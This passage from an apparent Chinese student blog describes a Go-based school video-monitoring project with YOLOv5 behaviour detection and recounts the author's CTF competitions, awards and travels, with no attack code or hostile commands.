支持对所识别到的违规事件进行告警，单次告警以事件为单位；支持推送信息至指定人员或公众号；支持优化报警频率:</li></ol><pre><code>后端使用gin-web框架通过处理HTTP请求，实现了推送信息至公众号。首先，To_weixin函数接收前端处理的POST请求，调用微信API向微信公众号发送消息。然后，调用Get_token和Get_openid函数通过发送Get请求，请求API来获得访问令牌和关注公众号的用户ID列表。最后，解析前端传来的JSON，并将其解析为Weixin_Results结构，构造消息发送到WeChat组，使用WeChat官方API将消息发送给所有关注公众号的用户。使用此方法，降低了服务器压力，充分地提高了资源利用率，实现了低时延报警推送公众号。对于项目的报警频率优化，算法端将每次告警以事件为单位，只有当同一事件被多次检测到时才会触发告警。这种方式能够避免由于随机噪声等因素导致的虚警，同时也能够减少同一事件被重复告警的情况。同时，项目支持根据用户的需要自定义告警频率，用户可以根据实际情况设置告警的时间间隔和告警次数。例如，在某些场景下用户需要及时获得每一个违规事件的告警，可以设置短时间间隔和高频告警；而在一些较为宽松的场景下则可以设置较长的时间间隔和低频告警。</code></pre><ol start="5"><li>  支持处置报警事件，未处置的报警高亮提示，已处置的报警可记录处置情况:</li></ol><pre><code>控制台页面提供专门的日志菜单栏，可以显示所有已处理的报警的详细信息，报警菜单栏可以对未处理的事件进行显示，提醒管理员处理。</code></pre><ol start="6"><li>  系统可接入模拟现场的测试视频流，可以完成测试操作并直观显示业务结果:</li></ol><pre><code>后端使用Go语言的Gin框架和GStreamer，通过gst-launch-1.0工具，实现了从接入模拟现场的测试RTSP视频流中提取H.264编码的视频数据，将其解码后，使用flvmux元素封装为FLV格式的视频文件，并将其保存在磁盘内，并将生成的FLV文件作为HTTP响应的内容类型，设置HTTP响应头为“video/x-flv”，将其传输给客户端。通过使用FFmpeg和GStreamer这两个多媒体框架，低资源占用率的条件下实现了视频的解码、编码、转换等操作；在同一个函数中并发地实现了客户选中的8个重点地区的rtsp视频流到flv格式文件的转换，实现了业务的灵活组合配置，可以适应不同项目的需求。</code></pre><ol start="7"><li>  支持模型服务的二进制封装和灵活组合，可配置为高并发低时延、高资源利用率等多种模型服务方式适应不同项目需求:</li></ol><pre><code>后端接收前端不同类型任务的灵活组合，并将任务需求添加到数据库中。使用goroutine和sync包中的WaitGroup来实现轻量级高并发，实现了模型服务的低时延，充分地提高了资源的利用率。遍历从数据库中检索到的所有摄像头记录，并为每个摄像头创建一个goroutine线程来调用编写的Judge函数进行处理。实现了并发处理多个摄像头的数据，提高了运行的效率。 使用了sync.WaitGroup的Add方法来增加计数器，表示要等待的goroutine数量。每个goroutine在处理完毕后都会调用WaitGroup的Done方法来减少计数器的值，表示已完成一个goroutine的处理。使用WaitGroup的Wait方法可以阻塞程序，直到计数器的值为0，即所有goroutine都已完成处理。 在每个goroutine线程内部，使用了defer语句来确保在函数执行结束后调用WaitGroup的Done方法，以便适当地更新计数器的值。对于多个线程之间存在的共享内存竞争，使用了读写锁、互斥锁等来对多线程的共享数据来进行限制，实现了数据的一致性。</code></pre><ol start="8"><li>  支持模型服务的二进制封装和灵活组合配置，适应不同项目需求，方便模型更新及功能扩展需求:</li></ol><pre><code>使用Docker这一支持二进制封装和灵活配置的框架，可以将封装好的模型镜像文件部署在不同的环境中，通过将模型封装为镜像文件并进行灵活组合配置，实现了可以方便地进行模型更新和功能拓展需求，具有更好的可移植性和拓展性。 使用Kubernetes进行模型服务的管理和部署，其提供的可拓展容器编排平台，实现了自动化部署、拓展和管理容器应用，实现了均衡负载的功能。</code></pre><ol start="9"><li>  支持训练过程自动化、规范化，实现对不同模型的数据处理、模型训练、评测、量化等不同功能进行灵活组合和保存，支持快速且仅进行必要计算的重复训练，以支撑更多部署场景（如增加新的学校需补充新数据进行训练等）:</li></ol><pre><code>对于训练过程的自动化、规范化，项目的模型训练算法已经与数据预处理功能进行结合，并使用 BoTNet网络架构优化 YOLOv5 算法。BoTNet网络架构基于 MobileNetv3 和 efficientNet 的结构设计，可以在保持优异性能的同时，大幅减少模型的计算量和内存占用，使得模型训练的精度与速度相较于原本单一的yolov5算法进一步提升。同时，得益于yolov5算法的便捷性，用户只需传入标记好的数据集，并指定阈值进行训练，而无需进行多余操作，实现了训练过程的自动化、规范化，同时也使得项目支持用户进行快速且进行必要计算的重复训练，使得项目能够支撑更多的部署场景，允许用户补充数据进行统一训练。其次，对于不同模型的数据处理、训练、评测、量化等功能，go语言后端采取并行执行策略，允许多路模型同时运行，实现了针对不同模型进行单独的数据处理、训练、评测与量化。对于每路模型的评测与量化方面，项目对每路模型都采用了统一的评测与量化标准，通过使用交叉验证方法以及计算模型的精度、召回率与F1-score，进行综合性的评测与分析，从而保证模型的效果。</code></pre><ol start="10"><li>  支持完善的监控和日志，便于观测系统的性能和资源使用:</li></ol><pre><code>后端保存了每一条算法端实时返回的检测数据，低延时地添加到数据库中，作为返回给前端的日志内容。将检测数据添加到数据库使用原生SQL语句，使项目具有更高的灵活性、更好的可控性和更好的可移植性，可以更方便地移植到其它的数据库系统中，更简单地控制查询的执行计划和优化，确保了SQL语句的执行效率和性能，实现了检测数据实时地插入日志。后端使用了Go语言的Gin框架和runtime包，实现了快速、高性能的CPU监测功能与获取当前程序的内存使用情况功能，将其以JSON格式返回给客户端。通过runtime包中的函数获取当前的CPU核心数与对内存使用情况的监测，并使用time包中的函数计算CPU使用情况。然后代码将结果封装成CPUUsage与MemUsage结构体，将其转换为JSON格式返回给前端。这对于检测系统的性能和资源使用非常重要，充分地体现了使用Go语言原生的内存管理机制的优势，可以帮助开发人员有效地避免常见的内存错误，便于观测系统的性能和资源使用情况。</code></pre><ol start="11"><li>  系统具有良好的性能、功耗表现和可扩展性和成本优势，可支撑区县级数量规模的学校的接入:</li></ol><pre><code>首先，系统具备完整的性能测试方案和监控策略，能够针对系统的性能指标进行分析判断，用Golang编写性能测试程序，通过模拟大量并发调用算法端脚本，测试并对系统进行调优。其次，系统资源占用率低，在同样的硬件条件下功耗低的优点，降低了系统搭建成本，具有成本优势。最后，系统具有可拓展性的后端架构，支持垂直拓展和水平拓展，能够支持县级数量规模的业务。</code></pre><ol start="12"><li>  通过人工智能支持对人员探出围栏的状态进行识别:</li></ol><pre><code>围栏防护区域定义为，有围栏且围栏区域超过人员腰部区域；以人员身体腹部为准，腹部超出围栏内侧视为探出，并进行告警；计算探出以围栏外侧边为准线，超出围栏内侧边即视为探出针对人员探出围栏的状态，项目通过对应数据集的训练，使得算法端能够大致检测到人员探出围栏这一行为，同时也能够获取围栏大致范围与人员状态信息，从而进行对比，进而辅助判断。具体而言，当算法端检测到有人员出现在围栏内部时，可以通过对围栏的边界进行检测并确定围栏的位置和大小，进而给出该人员距离围栏的距离和方向信息。在算法判断人员是否探出围栏时，可以通过将围栏范围与人员位置信息进行对比，进一步确定人员是否已经探出围栏。同时，还可以通过对人员状态信息的分析和比对，判断人员是否有异常行为或异常状态，进一步加强围栏安全管理。</code></pre><ol start="13"><li><p>通过人工智能提供对于人员待在危险区域时间过长进行识别</p><pre><code>  边缘防护区域指定为无围栏或围栏高度不超过成年人腰部的区域</code></pre></li></ol><pre><code>对于边缘防护区域以人员出现在该区域时间进行告警人员停留x秒后产生告警，x的具体值可配置。对于危险区域或其它限制区域，算法端提供了对于该区域的人员检测功能，用户可以在该区域摄像头对应的交互项中选择对应的模型并设置指定阈值，当该区域出现人时，，该功能将会自动检测并统计该人员在该区域内的停留时间长度，进一步提供对于人员待在危险区域时间过长进行识别和预警的服务。该功能的实现需要使用人工智能技术中的目标检测和计时统计等算法。通过对该区域中的摄像头拍摄到的画面进行分析，可以识别出人员在该区域的位置和活动。同时，通过对检测到的人员在该区域内的停留时间进行计时，可以判断人员待在该区域的时间是否超过了规定的阈值。在实际应用中，用户可以根据自己的需求选择不同的模型和阈值进行设置，并且可以通过系统提供的管理界面直观地查看该区域内人员的活动情况以及超时预警信息。这样，用户可以及时采取相应的措施，保证区域内人员的安全。</code></pre><ol start="14"><li>  通过人工智能提供对挥手、抽烟、跌倒行为进行识别:</li></ol><pre><code>对人员挥手、抽烟、跌倒等行为进行识别；可以应用于人员密集区域，在人员密集区域保持识别效率。对于挥手、抽烟、跌倒行为，项目通过多种渠道获取不同场景、环境、角度、状态以及部分特殊状态的挥手、抽烟、跌倒行为图片，并采取人工标注方式标注数据集。在标注过程中，针对某一指定行为图片，进行多行为标记，从而保证目标对象的准确性。除此以外，在模型训练中，项目使用了多轮训练技术，这也是提高模型准确率的一个重要步骤。通过标注后的一般图片进行训练获取上游模型，再针对于学校中监控视角图片进行下游训练，从而提高模型的适用性。这样可以进一步提高模型的准确性，并使其更好地适应不同的场景和环境。</code></pre><ol start="15"><li>  通过人工智能提供对路面积水、墙面房顶渗漏水进行识别:</li></ol><pre><code>可识别雨天路面积水情况，对于严重积水进行告警；可识别机房等房屋墙壁上的渗水情况并进行告警。对于路面积水、墙面房顶渗漏水的识别，项目以yolov5算法为基础，对拍摄到的路面、墙面等部位的图像进行分析和处理。通过对图片中的色彩、纹理、形状等特征进行提取和分析，从而能够准确判断积水与房顶渗漏水存在情况。同时，为了提高识别的准确性，算法端预留了与传感器结合的方法。允许用户接入传感器，获取对应区域的温度、湿度等信息，从而辅助目标检测算法进行对应状况的检测。</code></pre><ol start="16"><li>  基于K8s和微服务架构，提供良好的容器封装和高性能的接口调用，支持在K8s集群完成部署:</li></ol><pre><code>本系统采用微服务的架构分别将前端，后端，视频流转换，数据库部署到k8s集群，其中前端提供了友好的人机交互界面，通过算法优化减轻了对后端的数据访问频率，前端封装完善，只需要提供数据库后端ip与视频流转换ip即可实现部署，后端采用GO语言可以实现高并发的调用模型进行检测与处理，后端同样封装完善，只需要提供数据库的ip与端口即可，视频流转换，采用node.js通过异步编程，实现对rtsp流转换的高并发处理，与实时响应。数据库采用mysql数据库,通过将数据库单独部署的方式保证了数据库的稳定性，同时也提供容器卷挂载到本地的方式，通过nfs实现数据的互联互通。</code></pre><h3 id="项目分工"><a href="#项目分工" class="headerlink" title="项目分工"></a>项目分工</h3><ol><li>  王子负责算法端，毕师傅负责前端，我负责后端（当然还有安全，SQL注入、反序列化之类的漏洞我都考虑到了，毕竟做了很长时间的Web安全）</li></ol><h3 id="我的工作"><a href="#我的工作" class="headerlink" title="我的工作"></a>我的工作</h3><ol><li><p>  用Golang开发后端，Gin框架，管理员和普通用户的增删改查、权限分配都做得比较完善，对接算法端和前端</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111013425.png" alt="项目架构简图"></p></li><li><p>  SQL原生语句和Gorm同时使用操作数据库</p></li><li><p>  使用MySQL搭建数据库，同时需要对存取不是很频繁但是需要频繁分析的数据，我存到了hive中，数据库中存了管理员和普通用户的信息、视频流相关信息、分析结果等等，可以提供很完善的日志</p></li><li><p>  搭建基于MQTT的EMQX服务器，实现了前后端之间的实时数据传输（项目的第一版，毕师傅发现前端请求后端分析出的数据延迟很高，肉眼可见的那种高，我们就讨论了很多种方案，最后刘老师提议搭MQTT服务器，只是提出来了想法，我就硬着头皮做，真实现了，嘻嘻…）</p></li><li><p>  分布式计算：Hadoop建了很多slave节点同时分析视频流，实现了完全分布式（我们三个一个人手里都有一两台轻量级云服务器）</p></li><li><p>  视频流服务器：用Darwin搭了个推流和接收视频流的服务器，可以直接对接实体摄像头</p></li><li><p>  转码服务器：因为算法端需要flv流，我就搭了个ffmpeg转码服务器，把实体摄像头的rtsp流转成了flv流</p></li></ol><h3 id="部分补充"><a href="#部分补充" class="headerlink" title="部分补充"></a>部分补充</h3><ol><li>  为什么使用Golang作为后端语言：首先，我考虑到了项目需要多路视频同时分析的多线程高并发的需求，Go语言通过并发编程和轻量级的协程（goroutine）机制，提供了高效的并发处理能力。它内置了并发原语（如通道和互斥锁），简化了并发编程的复杂性，使该项目支持高性能的轻量级并发</li><li>为什么没用Java或者python，第一，该项目后端只有我一个人，Java的开发代码冗余量太大，不方便实现多线程高并发，但是我是Java转Go，Spring全家桶我也学得比较通，如果项目组人多，Java也未尝不可；第二，python真的很慢，很慢很慢，不能实现项目的实时性</li></ol><h3 id="获奖证书"><a href="#获奖证书" class="headerlink" title="获奖证书"></a>获奖证书</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011333.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011348.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011355.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011405.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111011412.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111035329.png"></li></ol><h2 id="安全——CTF"><a href="#安全——CTF" class="headerlink" title="安全——CTF"></a>安全——CTF</h2><h3 id="闲聊"><a href="#闲聊" class="headerlink" title="闲聊"></a>闲聊</h3><ol><li><p>  大一进CTF实验室，到2023年才开始拿奖，沉淀了很长时间，ctfshow、bugku、攻防世界都有我刷题的记录</p></li><li><p>  很荣幸能进CTF实验室，能够认识队友毕师傅和王子，能够认识佳琪哥等等大佬，有大佬带着打比赛</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d220be779b37e62d1d78ad1ae82b156.jpg" alt="实验室还没搬迁的时候我和队友的合照"></p></li><li><p>  打线下赛认识很多朋友，有电子科大的两位网安学院的师哥，有曲阜校区的兄弟们，还有很多校外的大佬等等</p></li><li><p>  打线下赛到处旅游，这一年先后去了合肥、哈尔滨、济南、北京</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0da71be22dadea9ca57c743ed7a9b38.jpg"></p><h3 id="全国大学生信息安全与对抗技术竞赛"><a href="#全国大学生信息安全与对抗技术竞赛" class="headerlink" title="全国大学生信息安全与对抗技术竞赛"></a>全国大学生信息安全与对抗技术竞赛</h3><ol><li>  国家一等奖，学校科创奖励15个科创分，大概7000块钱，很nice，小半年房租</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/a4150b0539fbb15174a3d0534697315.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/17faa583c638cacf9f3c2b0bf00720c.jpg"></li></ol></li></ol><h3 id="ciscn"><a href="#ciscn" class="headerlink" title="ciscn"></a>ciscn</h3><ol><li>  ciscn是第一次能够接触的线下赛，大一下止步线上初赛，大二终于可以去线下打（旅游）了</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0fd3beecf700c06c21f47931d7835e0.jpg" alt="线上初赛成绩"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/faaf7ec85302a6791d85bfcb3e503ea.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c3fad4766c7a93f2ce747ab4dc19a49.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/27644b0c5eb80f0a81d2738efa36ebc.jpg" alt="毕师傅的帅照，有小姑娘追的那种"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d2c92ec4f15e7fc18b45693251d99a7.jpg"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/1a3592fdabceac5a462eab057950ce3.jpg"></li><li>  第一次打AWDP赛制，整个队只有我一个人做出来题了。。。</li><li>  在合肥工业大学举办，去合肥转了转，看到了江苏卫视的大楼和国防科大的电子对抗学院（往前推两年是在这举办的）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c232fda8b0d3655ef5dc3b6d512adc6.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/9922fab47c6c777cc1946cf1910026f.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/3c8c918cb51d65abda47a658cbb6675.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/4326988a902d3fc85cb6eff1c465852.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/87dc9795e6df2150fdba858a12aa92b.jpg"></li><li>  前一天晚上熬夜打了场awd——bugku，之前准备的通防fix都会被查，mmp</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/80da4bc4d778a9aaf390e3f03e08e3c.jpg"></li><li>  能见到保研到中海洋的超哥，DebuGGer战队的创始人之一，我记得之前在实验室坐在我右边的右边，可以算是同窗一年，嘻嘻…</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/73b22055c82105b937df97d70495208.jpg"></li></ol><h3 id="蓝帽杯"><a href="#蓝帽杯" class="headerlink" title="蓝帽杯"></a>蓝帽杯</h3><ol><li>  最开始打蓝帽杯是2022年，当时线上初赛就止步了，比较遗憾，当时真的是处处碰壁，不只是蓝帽杯，强网杯、网鼎杯之类的都没有晋级</li><li>  今年是一路杀到总决赛，拿到国家三等奖</li><li>  好像所有的CTF比赛都没区分本科生和研究生，遇到了曲阜校区CTF实验室创始人王师哥，目前已经是电子科大博士，能够同台竞技很荣幸，压力也很大</li></ol><h4 id="半决赛——成功晋级"><a href="#半决赛——成功晋级" class="headerlink" title="半决赛——成功晋级"></a>半决赛——成功晋级</h4><ol><li><p>  赛场看起来比较豪华</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0320e135e6889331b2079e51a98fdbe.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/64b6fad07cad5f97d550cd6d2c39007.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b78392158563e8f98c4ecde13784416.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/fa5402f3e74dcd7041bbb6f2555f3a4.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/47ffe70611e78c41eaa09b93d305f33.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/7033092b2784aeeb90a78efd594a315.jpg"></p></li><li><p>  半决赛是在哈工大举行的，有幸逛了逛有核弹发射能力的高校</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/ac9a3b15a1f8969ebd7bd166f755740.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e625643b8a1012c38c011068e079a85.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/611cfc85034da91f78de91dc9ea4f57.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/1965e172cf1080dafc9b96bcbbb2d1c.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0f263b0546f1935df4c45f766cc7e2f.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/91dfa9bf52afd2033f919df19c99b53.jpg"></p></li><li><p>  坐灰机去的，美丽的日落</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/51473c35255a34e249324a4f150bd44.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c1f08f547c70a1d0b381fc611d54e77.jpg"></p></li><li><p>  作为一个山东人，来一次哈尔滨真的很不容易，就去和平大街之类的景点逛了逛</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/ee68203d70e2cad1cacb68f6425c590.jpg"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/7fb088f7e60b6200661988e15017822.jpg"></p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c95c9ca7bff5d7518ea8b9e43ef8f3b.jpg" alt="正宗的格瓦斯，和超市买的那种真的不一样奥"></p><h4 id="总决赛——三等奖"><a href="#总决赛——三等奖" class="headerlink" title="总决赛——三等奖"></a>总决赛——三等奖</h4><ol><li>  所有人的合照</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/92da6b4e20fbe5179f3333ef828bf3a.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/ce9f2481c5c85031fb5e3f1f0596bd1.jpg" alt="拿奖后大家都很开心"></li><li>  队伍介绍</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0a78b8c4f279467b102256a3dd1ab28.jpg"></li><li>  赛场大屏很帅，刘老师很happy，站C位</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/545a13ecc2a5d9a338a618deed87a56.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/76d66219ea2b4d27e47f1857db3cdd2.jpg"></li><li>  我们拿到了三等奖</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c73fd7fa433521010d976c2d597028a.jpg"></li><li>  佳琪哥他们拿到了二等奖</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/447360addd30331b873cd0f5a8ab4ac.jpg"></li><li>  发了个壳子又收上去了，因为需要部里盖章，时间比较长，到现在还没发下来证书</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/a72ecb89f913c55f93b117e0fe47372.jpg"></li><li>  组委会还给发了伴手礼，开出来奇安信的小老虎，后来去奇安信总部参观要88块钱一个</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/9f40174029ae016caa3f26eeab09396.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e4cc8c4743acb1aba33a0e0239cd5f5.jpg"></li><li>  鄙人帅照</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/17ca4bb2fd90fce5fe1ed7571360d56.jpg" alt="鄙人帅照"></li><li>  比完赛能去组委会奇安信总部逛逛，组委会大静姐给大家照了张合影</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/9c9b5ec0535a14b74e9e7829b8c453d.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/2ec69fdc535fe3f1d9517280bcbe581.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/be96b62bcd1b97c464106d45e0c2448.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/a28dd61cb0a9a27905c519c68d54670.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/978a792cd544531a4b33e9693d23e51.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/bd4d82a286b5133834104735abf4b09.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/0e785f76898a97306c7e3c4558a4315.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b27028988d8fde900dee8afb7a52905.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/1149a004e0fcf0de8352ead32318bc7.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/4dbfcd31f3adc7ad8bc4d1665887bb2.jpg" alt="前面有个大屏，放完会从中间打开，很赛博朋克"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d0ecb85aca803c83254f1254faf9241.jpg" alt="态势感知大屏"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/cfee16acb8ad2f688ad5a792cb1ba4f.jpg" alt="看起来很厉害的亚子，不愧是网安一哥"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/bff314528c210e57b843d92bfb795a2.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/cf34cfe2a543a661541c17ca3504a15.jpg"></li><li>  顺便去看了场升旗，真的是一夜没睡啊，半夜去排队，还排错了，预约的西直门，去的东直门，不过好像预约就能进，不区分通道</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c6a4d8ddf3c2b52f3eb8a25232b4634.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/e6003e2572ee2ae35bd7a522b41c01d.jpg"></li><li>  去了趟天坛，走的时候和队友说有一种似曾相识的感觉，因为德州和北京离得很近，来过很多次了</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/8d834d13678059f7fca3eeb34f11a13.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/ca4356af31dcea92e63aec61939d4d5.jpg"></li></ol><h3 id="山东省省赛——科来杯"><a href="#山东省省赛——科来杯" class="headerlink" title="山东省省赛——科来杯"></a>山东省省赛——科来杯</h3><ol><li>  拿到了团队三等奖和队伍里唯一一个个人奖——个人三等奖</li><li>  实战题分数比很多个人二等奖都高，但是理论题没答好，比赛前准备的题库不行，否则也是二等奖，奖金直接从2k缩水到500</li><li>  不过第一次线下赛个人收获三血，感觉自己起飞了</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E4%B8%89%E7%AD%89%E5%A5%96.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%9B%A2%E9%98%9F%E4%B8%89%E7%AD%89%E5%A5%96.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111035246.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/843b830b57a5431a87277cb89af6a8a.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/07dcd261094d2281d2d12d682ffc19f.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/64d633872a9bf221b87fc7b8a4640b3.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/61dc14979972ca7e38369eac8be0a90.jpg"></li><li>  因为比赛是在山警举办，来找张sir（不能再叫der哥了），张sir演出闭幕式，穿警服的样子很帅捏</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/f098470d092baf3f81a0318ba649a17.jpg"></li><li>  比赛场地</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/c22fa87d6cd8c0e26c12b0817e1e644.jpg"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/b4feb34bb2fec10066ca897ecdc37a2.jpg"></li><li>  组委会有钱，水和饭票之类的都是定制的</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/d7aa347ee448f1a55e2430da77817af.jpg"></li></ol><h3 id="山东省科技节——网安赛道"><a href="#山东省科技节——网安赛道" class="headerlink" title="山东省科技节——网安赛道"></a>山东省科技节——网安赛道</h3><ol><li>  省级二等奖，这应该是我CTF生涯中的第一个奖</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/cd7ec1a98f7073103123e68f0d451e9.jpg"></li><li>  比赛中的golang语言的iris框架的ssrf漏洞现在还记忆清晰，很新颖，但是还是做出来了</li></ol></li></ol><h2 id="省政府奖学金"><a href="#省政府奖学金" class="headerlink" title="省政府奖学金"></a>省政府奖学金</h2><ol><li>  学院里把我推上去竞争省政府奖学金</li><li>  一共推了三个人，20级佳琪哥（20级，DebuGGer战队大哥）、许师哥（21级，ACM大哥），还有菜菜的我</li><li>  最后答辩的时候太紧张了，三分钟的答辩中间好像楞了得半分钟，什么都没说出来，答辩分数很低，遗憾错失省政府奖学金，6k，还浪费了学院3个名额中的一个</li><li>  人生中第一次穿西服，还是借的</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/70a14226caca5dfc2f46ecc0b276a15.jpg"></li><li>  导员最后找我谈话，也因为错失省政府奖学金、浪费学院一个名额不太高兴，让我明年竞争国家奖学金别再出这种岔子</li></ol><h2 id="表彰大会"><a href="#表彰大会" class="headerlink" title="表彰大会"></a>表彰大会</h2><ol><li>  学院里开了个表彰大会，又借了一次西服，感觉穿起来很帅</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/45c3d16e3a7526be401c4b2afd5dd75.jpg"></li></ol><h2 id="攻防演练"><a href="#攻防演练" class="headerlink" title="攻防演练"></a>攻防演练</h2><ol><li>  第一次打攻防演练的红队，最开始真的很坐牢，不过有大佬带，最后的结果还是很好的</li><li>  队友比我小一岁，19岁，高中毕业直接全职某中厂，技术很好，全场最高分，比很多机关单位派出的代表队都高</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240111035631.png"></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>侧信道攻击</title>
      <link href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
      <url>/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</url>
      
